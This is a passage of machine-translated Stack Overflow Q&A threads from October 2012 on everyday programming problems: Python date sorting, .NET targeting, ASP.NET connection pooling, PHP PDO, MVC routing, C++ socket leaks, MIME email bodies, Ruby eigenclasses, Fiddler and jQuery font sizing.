如果您的数据需要更改，这具有允许您显式[指定日期的字符串格式的辅助好处。](http://docs.python.org/library/datetime.html#strftime-strptime-behavior)

编辑：

[mgilson](https://stackoverflow.com/users/748858/mgilson)提出了一个有趣的观点。 `str.split`可能更有效。让我们看看他是否正确：

`strptime`解决方案：

```
bburns@virgil:~$ python -mtimeit -s"from datetime import datetime;d={'2012-2-12':None, '2012-10-9':None, '1978-1-1':None, '1985-10-9':None}" 'sorted(d, key=lambda x: datetime.strptime(x,"%Y-%m-%d"))'
10000 loops, best of 3: 79.7 usec per loop 
```

[mgilson的](https://stackoverflow.com/users/748858/mgilson)原始`str.split`解决方案：

```
bburns@virgil:~$ python -mtimeit -s"from datetime import datetime;d={'2012-2-12':None, '2012-10-9':None, '1978-1-1':None, '1985-10-9':None}" 'sorted(d,key=lambda x: [int(y) for y in x.split("-")])'
100000 loops, best of 3: 17.6 usec per loop 
```

[米吉尔森的](https://stackoverflow.com/users/748858/mgilson) `zfill` `str.split`解决方案：

```
bburns@virgil:~$ python -mtimeit -s"from datetime import datetime;d={'2012-2-12':None, '2012-10-9':None, '1978-1-1':None, '1985-10-9':None}" 'sorted(d,key=lambda x: [y.zfill(2) for y in x.split("-")])'
100000 loops, best of 3: 7.4 usec per loop 
```

看来他是对的！ [mgilson 的](https://stackoverflow.com/users/748858/mgilson)原始答案快了 4-5 倍，他的最终答案快了 10-11 倍！然而，正如我们在评论中同意的那样，可读性很重要。除非您目前受 CPU 限制，否则我仍然建议您使用`datetime.strptime`over `str.split`。

# .net - VS2012编译.net 4？

> ID：12820968
> 
> 赞同：1
> 
> 时间：2012-10-10T13:50:51.083
> 
> 标签：.net, asp.net-mvc-4, visual-studio-2012

我一直在从事一个使用 VS2012 MVC 4.5 从头开始​​创建的大型项目。我将它发布在我们的服务器上，该服务器上只安装了 .net 4.0，但我遇到了错误（很不稳定）。Corp IT 表示，他们需要几个月的时间才能批准并安装 4.5 - VS2012 有没有办法将项目编译为 4.0？如果可能的话，我会失去捆绑/缩小等功能吗？

我不想不得不尝试将我所有的代码移植到 VS2010....

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-10T13:53:25.357

只需打开项目属性并将“应用程序”选项卡上的“目标框架”更改为“.NET Framework 4”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:58:25.973

您可以将 Target 框架设置为您想要的任何版本，包括 .Net 4.0

![在此处输入图像描述](../Images/d0e7faf1cbf91bae518fd598a2dca018.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T13:55:32.480

您可以将 TargetFramework 设置为 4.0 :) ![在此处输入图像描述](../Images/da7f8bd436c04a8bc06ae1347e5a165f.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-10T13:57:30.723

也可以在构建项目时在 msbuild 中指定工具集，使用

msbuild yoursolution.sln /toolsversion:4.0

这样您就不必在项目设置中更改它。

此链接更详细地解释了有关工具集 [http://msdn.microsoft.com/en-us/library/bb383796.aspx](http://msdn.microsoft.com/en-us/library/bb383796.aspx)

# c# - ASP.NET 中重新使用数据库连接以将 MS Access 迁移到 SQL 服务器的最佳实践是什么？

> ID：12820969
> 
> 赞同：0
> 
> 时间：2012-10-10T13:50:52.503
> 
> 标签：c#, asp.net, connection, connection-pooling

在具有大约 5 个使用相同数据库的 Web 方法的 ASP.NET Web 服务（C# 4.0）中打开和重用数据库连接的最佳实践是什么？理想情况下，MS Access 和 SQL 服务器的答案是相同的。

1.  全局私有变量：

    一个。优点：如果更改数据库提供程序，易于维护

    湾。缺点：不能使用“using”子句，连接可能保持打开太久——连接大约保持打开多长时间？

2.  将 db 连接作为方法参数传递：

    一个。优点：可以在不需要时关闭连接使用'using'子句

    湾。缺点：到处维护和传递参数很烦人

3.  在任何方法需要时使用 using 子句打开和关闭连接：

    一个。问题：这是最慢的，因为您必须多次重新打开同一个连接？或者因为幕后的连接池，这不是更慢吗？因此，这可能是最佳实践……？

    湾。问题：连接池是否仅与 SQL 服务器相关，因此不适用于 MS Access？

起初我正在考虑使用全局私有变量（OleDbConnection），因为我在 Web 方法和支持方法中使用到主数据库的连接相当多，并且将在不久的将来从 MS Access 迁移到 SQL Server，并将很容易做出改变。

但是在阅读了一些文章后，例如[使用 ASP.NET 和 Web 服务时最有效地获取 SQL 连接](https://stackoverflow.com/questions/12429519/obtaining-sql-connection-most-efficiently-when-using-asp-net-and-web-services)

似乎我可以使用“使用”子句在任何地方按需创建新连接而不会受到性能影响？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T13:57:55.487

ASP.Net将数据库连接*池*化，因此您不必担心这些低级细节。查看[这篇 MSDN 文章的提示 3](http://msdn.microsoft.com/en-us/magazine/cc163854.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-10T13:59:51.580

最佳做法是根本不重用您的 Connection 对象。

```
public void GetEmployees() As List<Employee> {
    var employees = new List<Employee>();
    using (var connection = new SqlConnection(Configuration.ConnectionString)) {
        using (var command = connection.CreateCommand()) {
            command.CommandText = "SELECT * FROM dbo.Employee";
            connection.Open();
            using (var reader = command.ExecuteReader()) {
                while (reader.Read()) {
                    employees.Add(Employee.CreateRecordFromOpenReader(reader));
                }
            }
        }
    }

    return employees;
} 
```

然后，如果您需要使用此功能的任何事务，请设置 DTC 并执行此操作。

```
using (var scope = new TransactionScope()) {
    var employees = GetEmployees();
    employees.Map((e) => e.Status = Status.Active);
    scope.Complete();
} 
```

# php - 在下拉菜单中显示特定字段的数据库条目

> ID：12820970
> 
> 赞同：0
> 
> 时间：2012-10-10T13:50:53.157
> 
> 标签：php

目前我正在使用以下代码在下拉菜单中显示所有帐户类型：

[HTML]

```
<select name="sel-account-name" id="sel-account-name" class="cp-controls-sml input-select input-select-xxlrg" tabindex="6">
    <option value="0">Select Account</option>

    <?php echo $options?>

</select> 
```

[PHP]

```
<?php

## Get all accounts from tblAccounts to display on add user page

mysql_connect('localhost', 'root', '');

mysql_select_db('database');

$sql="SELECT AccountName FROM tblaccounts";
$result=mysql_query($sql);

$options="";

while ($row=mysql_fetch_array($result)) {

    $id=$row["Id"];
    $accname=$row["AccountName"];
    $options.="<OPTION VALUE=\"$accname\">".$accname.'</option>';

}

?> 
```

哪个工作得很好...我正在尝试使用 PDO 编写此代码，如下所示：- 如果有人可以提供帮助，我只需要一点帮助，因为我已经尝试过，但似乎无法让它工作。

```
public static function getAllAccounts() {

    $pdo = new SQL();
    $dbh = $pdo->connect(Database::$serverIP, Database::$serverPort, Database::$dbName, Database::$user, Database::$pass);

    try {

        $query = "SELECT AccountName FROM tblaccounts";

    $stmt = $dbh->prepare($query);

    $stmt->execute();

    $row = $stmt->fetch(PDO::FETCH_BOTH);

    $stmt->closeCursor();

}

catch (PDOException $pe) {
    die("Error: " .$pe->getMessage(). " Query: ".$stmt->queryString);
}

$dbh = null;

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:30:46.603

方法：

```
public static function getAllAccounts() {
    $pdo = new SQL();
    $dbh = $pdo->connect(Database::$serverIP, Database::$serverPort, Database::$dbName, Database::$user, Database::$pass);
    try {
        $query = "SELECT AccountName FROM tblaccounts";
        $stmt = $dbh->prepare($query);
        $stmt->execute();
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
        $stmt->closeCursor();
    } catch (PDOException $pe) {
        die("Error: " .$pe->getMessage(). " Query: ".$stmt->queryString);
    }
    $dbh = null;
    return $rows;
} 
```

输出：

```
foreach(<classname>::getAllAccounts() as $acct) {
    $options.=sprintf('<option>%s</option>', $acct['AccountName']);
} 
```

# c# - 关于 ASP.NET MVC 路由

> ID：12820971
> 
> 赞同：1
> 
> 时间：2012-10-10T13:50:55.483
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-routing, maproute

比如我得到一个过滤器模型：

```
public class  Filter
{
   public int  Id{get;set;}
   public  string Name{get;set;}
  public  DateTime CreateTime{get;set;}
} 
```

并且有一个 SearchController 动作，例如：

```
public  ActionResult  Search(Filter  filterModel)
{
      List<Model>  model =SampleBll.get(filterModel)
} 
```

所以问题是。如何配置 URL

```
/Search/{Filter.Id}_{Filter.Name}_{Filter.CreatTime}/ 
```

谢谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T14:24:38.297

您可以在控制器中将其`{Filter.Id}_{Filter.Name}_{Filter.CreatTime}`视为`string filter`并解析它。

```
public ActionResult Search(string filter)
{
   var parts = filter.Split("|".ToCharArray());

   Filter model = new Filter();
   model.Id = Int32.Parse(parts[0]);

   // ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T11:51:07.850

您首先需要在默认路由**之前**将以下路由添加到 Global.asax.cs`RegisterRoutes`方法中：

 **```
routes.MapRoute(
    "Search", // Name
    "Search/{Id}_{Name}_{CreateTime}", // url format
    new { controller = "Search", action = "Search" } // Defaults
    ); 
```

完成此操作后，使用触发路由的 url 访问您的应用程序`/Search/123_Test_06-01-2011`，并且内置对象映射将负责将属性映射到模型，只要路由中的参数名称与属性，它们可以成功地转换为相应的类型。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T14:28:37.147

使用字符串或更改 _ per /`{Filter.Id}/{Filter.Name}/{Filter.CreatTime}`**

# asp.net-mvc - html helper 语法去一个 javascript 函数

> ID：12820974
> 
> 赞同：0
> 
> 时间：2012-10-10T13:51:03.510
> 
> 标签：asp.net-mvc, html-helper

> **可能重复：**
> [复选框生成的服务器端的 keyup 或 onclick 事件](https://stackoverflow.com/questions/5025524/keyup-or-onclick-event-for-checkbox-generated-server-side)

我搜索并没有找到任何东西，我有一个复选框，当我改变时我想去一个功能。像这样：

```
<input type="text" id="fname" onchange="upperCase()" /> 
```

目前我有这个

`@Html.CheckBoxFor(modelItem => item.user, new { @id = "chk" + item.id, @class = "chk" })`

在 html 帮助器中转到 javascript 函数的语法是什么？

# c++ - 关闭套接字不释放文件描述符

> ID：12820976
> 
> 赞同：9
> 
> 时间：2012-10-10T13:51:07.290
> 
> 标签：c++, linux, sockets, ulimit

在对我编写的某些服务器代码进行压力测试时，我注意到即使我在描述符句柄上调用 close()（并验证结果是否有错误），但描述符并未释放，最终导致 accept() 返回一个错误“打开的文件太多”。

现在我明白这是因为 ulimit，我不明白为什么我在每个同步接受/读取/发送周期后调用 close() 时会点击它？

我通过使用 lsof 运行手表来验证描述符是否确实存在：

```
ctsvr 9733 mike 1017u sock 0,7 0t0 3323579 无法识别协议
ctsvr 9733 mike 1018u sock 0,7 0t0 3323581 无法识别协议
...
```

果然有大约1000个左右。此外，使用 netstat 检查我可以看到没有挂起的 TCP 状态（没有 WAIT 或 STOPPED 或任何东西）。

如果我只是从客户端执行单个连接/发送/接收，我会注意到套接字确实保留在 lsof 中；所以这甚至不是负载问题。

服务器在 Ubuntu Linux 64 位机器上运行。

有什么想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T05:28:03.230

因此，使用 strace（感谢 Gearoid），我不知道没有它我是如何生活的，我注意到我实际上正在关闭描述符。

然而。为了子孙后代，我揭露了我的愚蠢错误：

```
Socket::Socket() : impl(new Impl) {
    impl->fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ....
}

Socket::ptr_t Socket::accept() {
    auto r = ::accept(impl->fd, NULL, NULL);
    ...
    ptr_t s(new Socket);
    s->impl->fd = r;
    return s;
} 
```

如您所见，我的构造函数立即分配了一个套接字，然后我用 accept 返回的描述符替换了描述符——造成了泄漏。我已将接受代码从独立的 Acceptor 类重构为 Socket 类，而没有更改它。

使用 strace 我可以很容易地看到 socket() 每次都在运行，这导致了我的灯泡时刻。

感谢大家的帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-15T03:46:32.200

你有没有在 close() 之后调用 perror() ？我认为返回的字符串会给你一些帮助；

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T14:24:08.563

你很可能挂在`recv()`or`send()`命令上。考虑使用设置超时`setsockopt`。

当套接字在另一端关闭时，我注意到 lsof 上有类似的输出，但我的线程保持套接字打开，挂在`recv()`等待数据的命令上。

# php - 从电子邮件正文中删除标题

> ID：12820979
> 
> 赞同：2
> 
> 时间：2012-10-10T13:51:15.590
> 
> 标签：php, email, header, content-type

我在使用电子邮件同步应用程序时遇到问题，我正在为我的项目开发一个对话模块，所以我从电子邮件帐户中提取了电子邮件正文和附件，但问题是我在电子邮件正文中也有一些标题文本，例如

```
"--PHP-alt-9ce0b24f8d52c4d37de61cb315107795d140f8b7 Content-Type: text/plain --PHP-alt-9ce0b24f8d52c4d37de61cb315107795d140f8b7 " 
```

我想删除它

实际输出为

```
--PHP-alt-9ce0b24f8d52c4d37de61cb315107795d140f8b7 Content-Type: text/plain --PHP-alt-9ce0b24f8d52c4d37de61cb315107795d140f8b7 Content-Type: multipart/related; boundary="PHP-related-9ce0b24f8d52c4d37de61cb315107795d140f8b7" --PHP-related-9ce0b24f8d52c4d37de61cb315107795d140f8b7 Content-Type: text/html Dear Milind

Thank you for choosing XXXXX for your limo hire.

Please accept this e-mail as confirmation the following booking has been
confirmed and requires you to print, sign and return the attached
contract with us, either by e-mail, fax or post, within 3 days.
To view contract for booking please click here
We would like to draw your attention to our agreed Terms and
Conditions concerning the booking and ask that you ensure you comply,
which can be found on our website www.xxxxx.co.uk

If this has been received in error, please contact our Office
immediately on XXXXXXX or XXXXXX.

Regards
Company name
TEL: 
```

我想要类似的东西

```
Dear Milind

    Thank you for choosing XXXXX for your limo hire.

    Please accept this e-mail as confirmation the following booking has been
    confirmed and requires you to print, sign and return the attached
    contract with us, either by e-mail, fax or post, within 3 days.
    To view contract for booking please click here
    We would like to draw your attention to our agreed Terms and
    Conditions concerning the booking and ask that you ensure you comply,
    which can be found on our website www.xxxxx.co.uk

    If this has been received in error, please contact our Office
    immediately on XXXXXXX or XXXXXX.

    Regards
    Company name
    TEL: 
```

我已经尝试过`substr()`，但它对任何正则表达式都没有帮助吗？这是电子邮件发送的代码让我们假设正文字符串=`$email_message`所有电子邮件格式都用“字符串”编写 PS：请注意，某些电子邮件包含附件

```
$subject = 'A sample email - Dual Format plus attachment plus inline';

// Create a boundary string.  It needs to be unique (not in the text) so ...
// We are going to use the sha1 algorithm to generate a 40 character string:
$sep = sha1(date('r', time()));

// Define the headers we want passed.
$headers = "From: StarLimosine <sender@gmail.com> \r\n X-Mailer: Custom PHP Script";
//$headers.="\r\nCc:sender@gmail.com";
$headers.="\r\nBcc:sender@gmail.com , sender@gmail.in";
// Add in our primary content boundary, and mime type specification:
$headers .= 
    "\r\nContent-Type: text/html; boundary=\"PHP-mixed-{$sep}\"";

// Prepare our attachment file - Read it in, encode it and split it
//$attached = chunk_split(base64_encode(file_get_contents('attachment.zip')));

// Also now prepare our inline image - Also read, encode, split:
$inline = chunk_split(base64_encode(file_get_contents('images/Logo.png')));

// Now the body of the message.
$body =<<<EOBODY
--PHP-mixed-{$sep}
Content-Type: multipart/alternative; boundary="PHP-alt-{$sep}"

--PHP-alt-{$sep}
Content-Type: text/plain

--PHP-alt-{$sep}
Content-Type: multipart/related; boundary="PHP-related-{$sep}"

--PHP-related-{$sep}
Content-Type: text/html

$email_message
<strong>
Star Limousines<br/>
TEL: 0800 9 556 556 <br/>
or 01435 813494</strong><br/>
<span style="font-size:10px">Registerd Office Pick Hill Farm, Horam East Sussex TN21 0JR</span>

--PHP-mixed-{$sep}--
EOBODY;
$body=$email_message;

mail($to,$subject,$body); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-10T13:54:11.677

在任何时候，标题都在前两行，对吗？如果是这种情况，您可以这样做：

```
substr($email, strpos($email, PHP_EOL, strpos($email, PHP_EOL) + 1)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-12-23T10:10:02.113

仅当您在使用 GET 时发布数据时才添加此内容，删除此内容。

```
$headers .= 
    "\r\nContent-Type: text/html; boundary=\"PHP-mixed-{$sep}\""; 
```

你会得到没有标题的响应

# ruby - 知道一个类是否是一个特征类

> ID：12820984
> 
> 赞同：3
> 
> 时间：2012-10-10T13:51:27.530
> 
> 标签：ruby, eigenclass

判断一个类`some_class`是否是某个对象的特征类的最佳方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-14T07:10:31.413

（在 Ruby 2.0 之前）以下表达式`true`仅在对象是特征类时才计算为 if an `x`：

```
Class === x && x.ancestors.first != x 
```

`===`等式检查断言它`x`是`Class`类的一个实例，不等式`!=`检查使用`ancestors`自省方法“跳过”特征类这一事实。对于作为类`x`实例的对象`Object`（即`x`不是空白的 slate 对象），`Class === x`检查等同于，`x.is_a? Class`或者在这种特殊情况下，等同于`x.instance_of? Class`。

从 Ruby 2.0 开始，上面的表达式不足以检测 eigenclasses，因为它对具有ed 模块`true`的类也进行了评估。`prepend`这可以通过附加检查来解决，该检查`x.ancestors.first`不是这样的前置模块，例如通过`Class === x.ancestors.first`. 另一种解决方案是将整个表达式修改如下：

```
Class === x && !x.ancestors.include?(x) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-10T14:03:57.910

总是有蛮力：

```
ObjectSpace.each_object.any? {|o| some_class.equal? (class << o; self; end)} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-02-01T21:12:41.030

至少在 2.1.0 中，有`Module.singleton_class?`：

```
Module.singleton_class?
#=> false
Module.new.singleton_class?
#=> false
Class.singleton_class?
#=> false
Class.new.singleton_class?
#=> false
Class.singleton_class
#=> #<Class:Class>
Class.singleton_class.singleton_class?
#=> true 
```

# c# - ServiceStack JsonServiceClient，强制本地主机的网络流量？

> ID：12820988
> 
> 赞同：6
> 
> 时间：2012-10-10T13:51:42.270
> 
> 标签：c#, json, rest, fiddler, servicestack

此 ServiceStack 客户端代码有效：

```
var client = new JsonServiceClient("http://localhost:32949/test");
var request = new MyRequest { ClassificationId = new ClassificationId (21300) };
var response = client.Post(request); 
```

但是，在观察 Fiddler 的流量时，我什么也没看到。我想观察流量，以便更好地了解如何为我必须编写的其他客户端构建所需的 JSON 请求。

为了使上述代码正常工作，我必须引用具有该服务的程序集，并且我怀疑 ServiceStack 正在进行一些巧妙的调用以避免发送 HTTP 请求。是这样吗？

为什么我在 Fiddler 中看不到任何流量，我该如何强制？

通过浏览器到 localhost 端点的 HTTP 流量显示正确。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-10T15:17:23.963

编辑您的主机文件，位于

> C:\Windows\System32\drivers\etc\hosts

并添加以下条目

127.0.0.1 mymachine.com

然后将您的客户指向`mymachine.com`而不是`localhost`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-10T15:18:01.340

我将在这里回答我自己的问题——评论者@wal 向我指出了这个问题：

这与 ServiceStack 无关，请求实际上是通过 http 协议进行的。问题是循环回本地主机并没有通过提琴手发送流量。它实际上在[Fiddler2 FAQ 页面](http://www.fiddler2.com/fiddler/help/hookup.asp#Q-LocalTraffic)上进行了解释。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-06-21T17:36:36.960

另一个技巧是用您的机器名称替换您的“localhost”uri，这应该可以与 Fiddler 一起使用。

`http://machinename:port/test`

# javascript - 计算文本字体大小以用文本填充容器

> ID：12820993
> 
> 赞同：4
> 
> 时间：2012-10-10T13:52:05.203
> 
> 标签：javascript, jquery

> **可能重复：**
> [自动调整大小的动态文本以填充固定大小的容器](https://stackoverflow.com/questions/687998/auto-size-dynamic-text-to-fill-fixed-size-container)

如果容器仅包含没有子元素的纯文本，则以下代码是可行的解决方案：

```
(function($) { 
  $.fn.textfill = function(options) { 
    return this.each(function() {
      var text = $(this).text();
      $(this).text('');
      var container = $('<span />').text(text).appendTo($(this));
      var min = 1, max = 200, fontSize;
      do {
        fontSize = (max + min) / 2;
        container.css('fontSize', fontSize);
        var multiplier = $(this).height()/container.height();
        if (multiplier == 1) { min = max = fontSize}
        if (multiplier >  1) { min = fontSize}
        if (multiplier <  1) { max = fontSize}
      } while ((max - min) > 1);
      fontSize = min;
      if ($(this).width() < container.width()) {
        min = 1;
        do {
          fontSize = (max + min) / 2;
          container.css('fontSize', fontSize);
          var multiplier = $(this).width()/container.width();
          if (multiplier == 1) { min = max = fontSize}
          if (multiplier >  1) { min = fontSize}
          if (multiplier <  1) { max = fontSize}
        } while ((max - min) > 1);
        fontSize = min;
      }
      container.remove();
      $(this).text(text);
      var minFontSize = options.minFontPixels;
      var maxFontSize = options.maxFontPixels;
      $(this).css('fontSize', 
                  minFontSize && (minFontSize > fontSize) ?
                  minFontSize :
                  maxFontSize && (maxFontSize < fontSize) ?
                  maxFontSize :
                  fontSize); 
    }); 
  }; 
})(jQuery); 
```

[在此处](http://jsfiddle.net/8Bs6W/)查看演示。

但是，如果容器包含孩子，我们说：

```
<div><span class="c1">text1</span>main text<span class="c2">text2</span></div> 
```

我们还想自动调整孩子的大小，使文本与作为文本节点的“主文本”保持相同的高度？儿童可能有不同的*字体系列*或其他参数。

如何改进上述算法以获得这样的结果？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-10T16:43:48.587

我玩了一点，在我看来我找到了解决方案。算法修改如下：

*   首先，您需要找到目标元素及其所有子元素的旧字体大小（不仅是第一层）
*   那么你需要计算一个系数，即字体大小应该改变多少，系数的计算应该与新的字体大小计算并行进行
*   并将该系数应用于目标及其所有子项的最终字体大小

这是工作[演示](http://jsfiddle.net/8Bs6W/15/)

**更新**

[这](http://jsfiddle.net/8Bs6W/20/)是您需要的解决方案，前一个比您需要的多一点，我只是想保留它，也许其他人会发现它有帮助。我还想注意第二个解决方案与第一个解决方案非常相似，除了系数部分，在这种情况下这是不必要的。

# html - 传递 Razor Markup 以查看和处理它

> ID：12820995
> 
> 赞同：0
> 
> 时间：2012-10-10T13:52:09.057
> 
> 标签：html, asp.net-mvc, razor, asp.net-mvc-4

我已经在互联网上搜索了几天，但没有找到这个。

我的模型有一个属性，其中包含一大块包含 Razor 标记的 html。示例：

```
public class ViewModel 
{
    public string Content = "<div>@Html.TextBox(\"UserName\")</div>";
} 
```

在视图中，我用

```
@Html.Raw(Server.HtmlDecode(Model.Content).toString()) 
```

我需要能够将 Razor 标记转换为 html，尽管因为内容是通过模型放入的，所以视图引擎不会处理它。

*   我试过简单地放入内容，只使用.Raw（Model.Content），.Encode（Model.Content），没有任何效果。

有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:10:24.253

您可以使用[RazorEngine](http://razorengine.codeplex.com/)包，它允许您解析和执行 Razor 代码。话虽这么说，我不建议您让您的用户直接编辑 Razor 模板。您正在您的网站上打开一个巨大的安全漏洞。

还有其他模板引擎，例如[DotLiquid](http://dotliquidmarkup.org/)，它们更适合您不信任用户输入的场景。